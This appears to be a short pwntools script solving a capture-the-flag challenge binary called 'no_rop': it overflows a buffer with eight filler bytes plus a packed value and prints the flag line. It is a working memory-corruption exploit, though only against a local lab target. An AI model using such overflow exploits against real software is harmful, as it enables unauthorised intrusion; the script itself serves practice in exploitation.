from pwn import *

p = process("./no_rop")
p.sendline(b"A" * 8 + p64(1))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
